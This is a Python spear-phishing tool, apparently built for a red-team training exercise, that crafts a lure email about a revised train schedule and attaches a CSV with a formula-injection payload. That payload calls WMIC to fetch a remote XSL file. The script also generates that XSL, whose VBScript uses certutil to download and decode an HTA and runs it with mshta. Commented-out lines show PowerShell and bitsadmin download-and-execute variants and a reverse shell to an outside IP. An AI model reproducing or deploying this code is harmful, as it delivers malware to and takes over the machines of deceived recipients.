"""Python script for SpearPhishing for CyberSheild2023 OPFOR ver1.0!!!"""


import socket
import struct
import sys, os
import smtplib
from email.mime.text import MIMEText
import email, textwrap
from email.mime.base import MIMEBase
from email import encoders
from email.mime.multipart import MIMEMultipart
import argparse
from argparse import ArgumentParser, HelpFormatter


class RawFormatter(HelpFormatter):
    def _fill_text(self, text, width, indent):
        return "\n".join([textwrap.fill(line, width) for line in textwrap.indent(textwrap.dedent(text), indent).splitlines()])
    
def parse_args():
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description='''
    
  /$$$$$$          /$$                         /$$$$$$ /$$      /$$         /$$      /$$        /$$$$$$  /$$$$$$  /$$$$$$  /$$$$$$ 
 /$$__  $$        | $$                        /$$__  $| $$     |__/        | $$     | $$       /$$__  $$/$$$_  $$/$$__  $$/$$__  $$
| $$  \__//$$   /$| $$$$$$$  /$$$$$$  /$$$$$$| $$  \__| $$$$$$$ /$$ /$$$$$$| $$ /$$$$$$$      |__/  \ $| $$$$\ $|__/  \ $|__/  \ $$
| $$     | $$  | $| $$__  $$/$$__  $$/$$__  $|  $$$$$$| $$__  $| $$/$$__  $| $$/$$__  $$        /$$$$$$| $$ $$ $$ /$$$$$$/  /$$$$$/
| $$     | $$  | $| $$  \ $| $$$$$$$| $$  \__/\____  $| $$  \ $| $| $$$$$$$| $| $$  | $$       /$$____/| $$\ $$$$/$$____/  |___  $$
| $$    $| $$  | $| $$  | $| $$_____| $$      /$$  \ $| $$  | $| $| $$_____| $| $$  | $$      | $$     | $$ \ $$| $$      /$$  \ $$
|  $$$$$$|  $$$$$$| $$$$$$$|  $$$$$$| $$     |  $$$$$$| $$  | $| $|  $$$$$$| $|  $$$$$$$      | $$$$$$$|  $$$$$$| $$$$$$$|  $$$$$$/
 \______/ \____  $|_______/ \_______|__/      \______/|__/  |__|__/\_______|__/\_______/      |________/\______/|________/\______/ 
          /$$  | $$                                                                                                                
         |  $$$$$$/                                                                                                                
          \______/                                                                                                                 

    
This is a phishing email generator for CyberShield2023 created for this Training Excersise Only:  

****** Need to create the XSL File to Upload to the redirector and put in the /Sliver directory before Using the -p Option!!!!!!***************

If using -x to create a xsl file for the phishing email use the following exmaple:
(This will create an xsl file that needs to be uploaded to the redirector in the Sliver folder)
                            
EXAMPLE: 
                             Domain         
EXAMPLE: python l33tPhish -x www.eaglesshootingheroes.net

If using the -p to create a payload use the following examples:
(This will use the redirector at www.eaglesshootingheroes.net to send an email using payload 3)

Payloads:
 1              Under Dev        : Powershell payload
 2              Under Dev        : Bitsadmin payload
 3                               : WMIC payload


EXAMPLE:
script              email:domain                  redirector                   payload                
python l33tPhish -p stevie.love@ot-nakatomi16.com www.eaglesshootingheroes.net 3

''', usage='%(prog)s [OPTIONS]', formatter_class=RawFormatter)
                                     
    parser.add_argument('-p', '--createPhish', nargs=4, metavar=('stevie.love@ot-nakatomi16.com', 'URL', 'payload number', 'target ip'), help='www.eaglesshootingheroes.net 3')
    parser.add_argument('-x', '--createxsl', nargs=1, metavar=('URL'),  help='www.eaglesshootingheroes.net')
    args = parser.parse_args()
    return args

def buildfile():
    input_url = sys.argv[3]
    case_number = int(sys.argv[4])
    filename = ("2023TrainSchedule.csv")
    current_directory = os.getcwd()
    spaces = " " * 300   # This is paddiing its sorta like catNip for Cats its helps the payload get hype!!!!!

    if case_number == 1:
    # #powershell useage!!! Will have to change payload name unless its the same as trainscheduler.exe
    #     cmdData = (f"+{spaces}cmd|'/q /c powershell -exec bypass -nop iex(ne^w-ob^je^c^t n^et.^we^bcl^i^en^t).^do^w^nl^o^ad^st^r^in^g(\\\'{input_url}\\\/trainscheduler\')!A1")
    #     try: 
    #         # create csv file
    #         with open(filename, 'w') as file:
    #             file.write(cmdData)
    #         print(f"check {current_directory} for {filename}")
    #         return filename
    #     except Exception as e:
    #         print(f"An error occurred: {str(e)}")
        print("Under Dev meow, however ran out of time to complete:     use payload 3")

    elif case_number == 2:
    #TODO: Have to test payload and set up executable
    #L33T bitsadmin
        # cmdData = (f"+        (cmd|'/q /c bitsadmin.exe /transfer dl /download /priority normal {input_url}/trainscheduler.exe c:\\windows\\temp\\trainscheduler.exe & c:\\windows\\temp\\trainscheduler.exe 158.51.28.193 4444 -e cmd.exe'!A1")
        # try: 
        #     with open(filename, 'w') as file:
        #         file.write(cmdData)
        #     print(f"check {current_directory} for {filename}")
        #     return filename
        # except Exception as e:
        #     print(f"An error occurred: {str(e)}")   
        print("Under Dev meow, however ran out of time to complete:     use payload 3")
        sys.exit(1)
    elif case_number == 3:
    #L33T WMIC will have to change payload name unless name is /trainscheduler\
        cmdData = (f"+{spaces}        (wmic|'os get /format:\"http://{input_url}/trainscheduler\"'!A1")
        try: 
            with open(filename, 'w') as file:
                file.write(cmdData)
                print(f"check {current_directory} for {filename}")
            return filename
        except Exception as e:
            print(f"An error occurred: {str(e)}")
    else:
        print("This is not the Way!!! Use a correct payload next time Bye!!!")
        sys.exit(1)
        
def emailStuff(args):
    email_domainuser = args[0]
    filename = buildfile()
    email_user = 'CatLivesMatter@nakatomi69.com'
    email_send = email_domainuser
    subject = 'Train Schedule Issues!!!!'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    #Awsomely crafted phishing email you are welcome!!!
    body = """ Dear Olivia, We wanted to inform you that our regional dispatch office has recently updated this year's train schedule. 
We have attached the revised schedule for your reference. We kindly request that you review it promptly and notify us immediately 
if you come across any issues or concerns. At our company, safety is of utmost importance, and we want to ensure that the train schedule aligns with our safety standards. 
If you have any specific concerns or questions regarding the updated schedule, please feel free to let us know, and we will address them promptly.
Thank you for your attention to this matter, and we appreciate your cooperation in prioritizing safety.

Best regards,
IronCat""" #ironcat is soo special

    msg.attach(MIMEText(body,'plain'))

    attachment =open(filename,'rb')

    part = MIMEBase('application','octect-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    #server = smtplib.SMTP('32.58.232.125',25)
    server = smtplib.SMTP(sys.argv[4])
    server.starttls()

    try:
        server.sendmail(email_user,email_send,text)
        print('Sending email now')
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    server.quit()
    print("Email sent, hopefully they clicked it")


def create_xsl(redirector):
    url = redirector
    url_redirector = url[0]
    try:
        with open('trainscheduler.xsl', 'w') as file:
            file.write(f'''<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
  <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
      <![CDATA[

Function RunMultipleCommands(commands)
    Set shell = CreateObject("WScript.Shell")
    For Each command In commands
        shell.Run command, 0, True 
    Next
End Function

Dim commandList
            commandList = Array("certutil -urlcache -split -f http://{url_redirector}/traintasks.b64 c:\\users\\public\\traintasks.b64", "certutil -decode c:\\users\\public\\traintasks.b64 C:\\users\\public\\traintasks.hta", "c:\windows\system32\mshta.exe c:\\users\\public\\traintasks.hta")
			
            RunMultipleCommands commandList

      ]]> </ms:script>
</stylesheet>''')
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def main():
    parsed_args = parse_args()
    num_args = len(vars(parsed_args))
    cli_arg = parse_args()
    try: 
        if parsed_args.createxsl is not None:
            redirector = parsed_args.createxsl
            create_xsl(redirector)
        elif parsed_args.createPhish is not None:
            args = parsed_args.createPhish
            emailStuff(args)
        else:
            print("Learn how to use python scripts try again. Hint you might want to look at the help option ex:  python l33tPhish.py -h :) ")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
if __name__ == "__main__":
    main()
